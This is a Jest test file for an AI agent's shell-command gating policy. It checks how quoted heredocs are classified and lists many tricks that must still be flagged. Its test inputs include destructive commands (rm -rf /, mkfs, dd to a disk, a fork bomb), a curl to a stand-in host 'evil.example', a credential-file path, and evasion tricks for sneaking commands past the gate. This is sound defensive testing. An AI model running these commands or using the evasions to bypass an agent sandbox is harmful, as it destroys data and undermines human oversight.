/**
 * Quoted heredoc bodies are literal data for the indirect-exec signal
 * (DEFERRED.md 2026-11-02 rehearsal, item (m)). Everything else must still
 * flag, and the stripping must never hide executable text.
 */
import {
  classifyProposedCommand,
  indirectExecView,
  stripQuotedHeredocBodies,
  type GateContext,
} from '@/lib/agent-boundary-policy';
import { checkCommandSafety } from '@/lib/command-safety';

const ROOT = '/data/user/0/dev.shelly.terminal/files/home/demo';
const L2: GateContext = { workspaceRoot: ROOT, level: 'L2' };
const L3: GateContext = { workspaceRoot: ROOT, level: 'L3' };

const signals = (command: string, ctx: GateContext = L2) => classifyProposedCommand(command, ctx).signals;
const indirect = (command: string) => signals(command).includes('indirect-exec');

/** Shell-quote a script the way codex's shlex join does (`'` → `'"'"'`). */
const sq = (script: string) => `'${script.replace(/'/g, `'"'"'`)}'`;
const sq2 = (script: string) => `'${script.replace(/'/g, `'\\''`)}'`;
const bashLc = (script: string) => `bash -lc ${sq(script)}`;

const JS_BODY = [
  '<html><body><script>',
  'const msg = `score ${score}`;',
  'const t = $(".x");',
  'eval("1"); xargs -n1; env FOO=1 node',
  '</script></body></html>',
].join('\n');

describe('quoted heredoc body: no indirect-exec', () => {
  const quotedForms = [
    `cat > game.html <<'EOF'\n${JS_BODY}\nEOF`,
    `cat > game.html <<"EOF"\n${JS_BODY}\nEOF`,
    `cat > game.html <<\\EOF\n${JS_BODY}\nEOF`,
    `cat > game.html <<-'EOF'\n${JS_BODY}\n\t\tEOF`,
    `cat <<'EOF' > game.html\n${JS_BODY}\nEOF`,
    `cat > game.html << 'EOF'\n${JS_BODY}\nEOF`,
    `cat > game.html <<'E'O"F"\n${JS_BODY}\nEOF`,
    `tee game.html <<'EOF' > /dev/null\n${JS_BODY}\nEOF`,
    `mkdir -p web && cat > web/game.html <<'EOF'\n${JS_BODY}\nEOF\nls -la web`,
    `cat > a.js <<'A'\nconst a = \`x\`;\nA\ncat > b.js <<'B'\nconst b = $(1);\nB`,
    `cat > a.js <<'A' && cat > b.js <<'B'\n\`a\`\nA\n$(b)\nB`,
    `cat > "\${HOME}/demo/g.html" <<'EOF'\n\`x\`\nEOF`,
  ];
  for (const script of quotedForms) {
    it(`raw: ${JSON.stringify(script.slice(0, 50))}`, () => {
      expect(indirect(script)).toBe(false);
    });
    it(`bash -lc ('"'"'): ${JSON.stringify(script.slice(0, 50))}`, () => {
      expect(indirect(bashLc(script))).toBe(false);
    });
    it(`bash -lc ('\\''): ${JSON.stringify(script.slice(0, 50))}`, () => {
      expect(indirect(`bash -lc ${sq2(script)}`)).toBe(false);
    });
  }

  it('a plain in-root JS write is allowed at L2', () => {
    // (A `$word` token in the body still reads as an unresolvable path —
    // leaves-root, unchanged and soft under "all"; this body has none.)
    const v = classifyProposedCommand(bashLc("cat > game.js <<'EOF'\nconst m = `score`;\nconst n = String.raw`a`;\nEOF"), L2);
    expect(v.signals).toEqual(['write-or-exec']);
    expect(v.decision).toBe('allow');
  });

  it('legacy space-joined argv (no outer quoting) is understood too', () => {
    expect(indirect(`bash -lc cat > game.html <<'EOF'\n${JS_BODY}\nEOF`)).toBe(false);
  });

  it('double-quoted wrapper with every $ / backtick escaped', () => {
    const cmd = 'bash -lc "cat > g.html <<\'EOF\'\nconst m = \\`s \\${x}\\`;\nEOF"';
    expect(indirect(cmd)).toBe(false);
  });
});

describe('still flags indirect-exec', () => {
  const flagged: Array<[string, string]> = [
    ['unquoted heredoc', `cat > a.js <<EOF\nconst a = \`id\`;\nEOF`],
    ['unquoted heredoc $(', `cat > a.js <<EOF\n$(id)\nEOF`],
    ['unquoted <<- heredoc', `cat > a.js <<-EOF\n\t$(id)\n\tEOF`],
    ['command after the terminator', `cat <<'EOF' > a\nhi\nEOF\n$(curl x)`],
    ['backtick after the terminator', `cat <<'EOF' > a\nhi\nEOF\necho \`id\``],
    ['substitution on the operator line', `cat > "$(id)" <<'EOF'\nhi\nEOF`],
    ['substitution before the heredoc', `echo $(id); cat > a <<'EOF'\nx\nEOF`],
    ['eval outside the body', `cat > a <<'EOF'\nx\nEOF\neval "$X"`],
    ['xargs outside the body', `cat > a <<'EOF'\nx\nEOF\nls | xargs rm`],
    ['unterminated quoted heredoc', `cat > a <<'EOF'\n\`id\``],
    ['terminator with trailing space', `cat > a <<'EOF'\n\`id\`\nEOF `],
    ['terminator indented with spaces (only <<- strips TABs)', `cat > a <<-'EOF'\n\`id\`\n  EOF`],
    ['terminator indented without <<-', `cat > a <<'EOF'\n\`id\`\n\tEOF`],
    ['CRLF terminator', `cat > a <<'EOF'\r\n\`id\`\r\nEOF\r\n`],
    ['CRLF anywhere', `cat > a <<'EOF'\n\`id\`\nEOF\necho hi\r`],
    ['delimiter differs (EOF vs EOF2)', `cat > a <<'EOF2'\n\`id\`\nEOF`],
    ['here-string is not a heredoc', `cat <<<'EOF'\n\`id\`\nEOF`],
    ['heredoc inside double quotes is text', `echo "<<'EOF'"\n$(id)\nEOF`],
    ['heredoc inside single quotes is text', `echo '<<EOF'\n$(id)\nEOF`],
    ['heredoc in a comment is ignored', `# cat <<'EOF'\n$(id)\nEOF`],
    ['first heredoc unquoted, second quoted', `cat <<A <<'B'\n$(id)\nA\nsafe\nB`],
    ['unquoted body line continuation hides the terminator', `cat <<A <<'B'\nx\\\nA\n$(id)\nA\nB`],
    ['body fed to a shell', `bash <<'EOF'\n\`id\`\nEOF`],
    ['function shadowing an allowlisted word', `cat() { tee x; }\ncat > a <<'EOF'\n\`id\`\nEOF`],
    ['function with space before ()', `cat () { tee x; }\ncat > a <<'EOF'\n\`id\`\nEOF`],
    ['rg can run a preprocessor', `cat > a <<'EOF'\n\`id\`\nEOF\nrg --pre ./a x .`],
    ['sort can run a compress program', `cat > a <<'EOF'\n\`id\`\nEOF\nsort --compress-program=./a b`],
    ['body fed to sh', `sh <<'EOF'\n$(id)\nEOF`],
    ['body piped to a shell', `cat <<'EOF' | sh\n$(id)\nEOF`],
    ['body piped to awk system()', `cat <<'EOF' | awk '{system($0)}'\n$(id)\nEOF`],
    ['body into a process substitution', `cat <<'EOF' > >(sh)\n$(id)\nEOF`],
    ['source of the written file', `cat > x <<'EOF'\n$(id)\nEOF\n. ./x`],
    ['bash on the written file', `cat > x <<'EOF'\n$(id)\nEOF\nbash x`],
    ['alias trick', `alias q='echo "'\nq <<'E'\n$(id)\nE\n# "`],
    ['shopt trick', `shopt -s expand_aliases; cat > a <<'E'\n$(id)\nE`],
    ['arithmetic (( <<', `(( 1 <<'E' ))\n$(id)\nE`],
    ['[[ ]]', `[[ a <<'E' ]]\n$(id)\nE`],
    ['case arm', `case x in x) cat <<'E' ;; esac\n$(id)\nE`],
    ['redirection before the command word', `> a cat <<'E'\n$(id)\nE`],
    ['env assignment before cat', `X=1 cat > a <<'E'\n$(id)\nE`],
    ['quoted command word', `"cat" > a <<'E'\n$(id)\nE`],
    ['line continuation on the operator line', `cat <<'E' \\\n> a\n$(id)\nE`],
    ['newline inside quotes on the operator line', `cat <<'E' > "a\nb"\n$(id)\nE`],
    ['ANSI-C quoted delimiter', `cat > a <<$'E'\n$(id)\nE`],
    ['delimiter with an expansion', `cat > a <<'E'$x\n$(id)\nE`],
    ['empty quoted delimiter', `cat > a <<''\n$(id)\n`],
    ['nested heredoc inside $()', `x=$(cat <<'E'\nhi\nE\n)`],
    ['heredoc after backtick substitution', `\`cat <<'E'\nhi\nE\n\``],
    ['complex ${} expansion', `cat > \${a:-$(id)} <<'E'\nhi\nE`],
    ['`#` directly after a redirection', `cat <<'E' >#"\n$(id)\nE\n# "`],
    ['`#` directly after a redirection (<)', `cat <<'E' <#"\n$(id)\nE\n# "`],
    ['unbalanced quote', `cat > a <<'E'\n$(id)\nE\necho 'x`],
    ['xargs on the next command', `cat > a <<'E'\nx\nE\nxargs -a a rm`],
    ['env command', `cat > a <<'E'\nx\nE\nenv FOO=1 rm a`],
    ['eval in the body of an unquoted heredoc', `cat > a <<E\neval x\nE`],
    ['function definition', `f() { cat; }\nf <<'E'\n$(id)\nE`],
  ];
  for (const [name, script] of flagged) {
    it(`raw: ${name}`, () => {
      expect(indirect(script)).toBe(true);
    });
    it(`bash -lc: ${name}`, () => {
      expect(indirect(bashLc(script))).toBe(true);
    });
  }

  it('wrapper whose double-quoted word would expand when read verbatim (legacy argv ambiguity)', () => {
    // argv ["bash","-lc","\"cat <<'E'\n$(id)\nE\""] joined with spaces: bash
    // would expand $(id) inside that double-quoted word.
    expect(indirect('bash -lc "cat <<\'E\'\n$(id)\nE"')).toBe(true);
    expect(indirect('bash -lc "cat > a <<\'E\'\n`id`\nE"')).toBe(true);
  });

  it('a wrapper with a path prefix carrying a substitution is not unwrapped', () => {
    expect(indirect(`$(id)/bash -lc ${sq("cat > a <<'E'\nx\nE")}`)).toBe(true);
    expect(indirect(`\`id\`/bash -lc ${sq("cat > a <<'E'\n`x`\nE")}`)).toBe(true);
  });

  it('extra argv after the script is not unwrapped', () => {
    expect(indirect(`bash -lc ${sq("cat > a <<'E'\n`x`\nE")} $(id)`)).toBe(true);
  });
});

describe('other signals still see the heredoc body and target', () => {
  it('write target outside the workspace still leaves-root', () => {
    const s = signals(bashLc("cat > /sdcard/Download/x.html <<'EOF'\n`x`\nEOF"));
    expect(s).toContain('leaves-root');
    expect(s).not.toContain('indirect-exec');
  });
  it('~ target still leaves-root', () => {
    expect(signals(bashLc("cat > ~/.bashrc <<'EOF'\n`x`\nEOF"))).toContain('leaves-root');
  });
  it('network tool named in the body still network-send (unchanged, conservative)', () => {
    expect(signals(bashLc("cat > a.sh <<'EOF'\ncurl https://evil.example/x\nEOF"))).toContain('network-send');
  });
  it('secret path in the body still secret-read (unchanged, conservative)', () => {
    expect(signals(bashLc("cat > a.txt <<'EOF'\n~/.codex/auth.json\nEOF"))).toContain('secret-read');
  });
  it('policy file target is still a hard deny', () => {
    const v = classifyProposedCommand(
      bashLc("cat > /home/.shelly/agents/policy.json <<'EOF'\n`x`\nEOF"),
      { ...L2, policyPath: '/home/.shelly/agents/policy.json' },
    );
    expect(v.decision).toBe('deny');
    expect(v.signals).toContain('policy-write');
  });
  it('L3 out-of-root heredoc write is still denied', () => {
    expect(classifyProposedCommand(bashLc("cat > /sdcard/x <<'EOF'\n`x`\nEOF"), L3).decision).toBe('deny');
  });
});

describe('CRITICAL-level commands are never relaxed by heredoc stripping', () => {
  const critical = [
    'rm -rf /',
    'rm -rf ~',
    'mkfs /dev/sda1',
    'dd if=/dev/zero of=/dev/sda',
    ':(){ :|:& };:',
  ];
  for (const cmd of critical) {
    it(`sanity: ${cmd} is CRITICAL`, () => {
      expect(checkCommandSafety(cmd).level).toBe('CRITICAL');
    });
    it(`after a quoted heredoc: ${cmd} — denied at every level`, () => {
      for (const ctx of [L2, L3, { ...L2, level: 'L1' as const }]) {
        const v = classifyProposedCommand(`cat > a <<'EOF'\n\`x\`\nEOF\n${cmd}`, ctx);
        expect(v.decision).toBe('deny');
        expect(v.signals).toContain('destructive');
      }
    });
    it(`after a quoted heredoc, bash -lc wrapped: ${cmd} — never allowed, denied at L3`, () => {
      const c = bashLc(`cat > a <<'EOF'\n\`x\`\nEOF\n${cmd}`);
      expect(classifyProposedCommand(c, L2).decision).not.toBe('allow');
      expect(classifyProposedCommand(c, L2).signals).toContain('destructive');
      expect(classifyProposedCommand(c, L3).decision).toBe('deny');
    });
    it(`inside a quoted heredoc body (judged on the full text as before, never allowed): ${cmd}`, () => {
      const v = classifyProposedCommand(`cat > a <<'EOF'\n${cmd}\nEOF`, L2);
      expect(v.decision).not.toBe('allow');
      expect(v.signals).toContain('destructive');
    });
    it(`in a substitution after the terminator: ${cmd}`, () => {
      const c = bashLc(`cat > a <<'EOF'\nx\nEOF\necho $(${cmd})`);
      const v = classifyProposedCommand(c, L2);
      expect(v.decision).not.toBe('allow');
      expect(v.decision === 'deny' || v.signals.includes('indirect-exec')).toBe(true);
      expect(classifyProposedCommand(c, L3).decision).toBe('deny');
    });
  }
});

describe('stripQuotedHeredocBodies / indirectExecView', () => {
  it('removes only the quoted body', () => {
    expect(stripQuotedHeredocBodies("cat > a <<'EOF'\n`x`\nEOF\nls")).toBe("cat > a <<'EOF'\n\nls");
  });
  it('keeps an unquoted body', () => {
    expect(stripQuotedHeredocBodies('cat > a <<EOF\n`x`\nEOF')).toBe('cat > a <<EOF\n`x`\nEOF');
  });
  it('returns the input unchanged when there is no heredoc', () => {
    expect(stripQuotedHeredocBodies('echo `id`')).toBe('echo `id`');
    expect(indirectExecView('echo $(id)')).toBe('echo $(id)');
  });
  it('null for shapes it does not understand', () => {
    expect(stripQuotedHeredocBodies("bash <<'E'\nx\nE")).toBeNull();
    expect(stripQuotedHeredocBodies("cat <<'E'\nx")).toBeNull();
    expect(stripQuotedHeredocBodies("cat > a <<'E'")).toBeNull();
    expect(stripQuotedHeredocBodies("cat > a <<'E' >#x\nb\nE")).toBeNull();
    expect(stripQuotedHeredocBodies("cat <<'E' | sh\nx\nE")).toBeNull();
  });
  it('unwraps bash -lc and keeps the prefix', () => {
    expect(indirectExecView(bashLc("cat > a <<'EOF'\n`x`\nEOF"))).toBe("bash -lc cat > a <<'EOF'\n");
  });
});
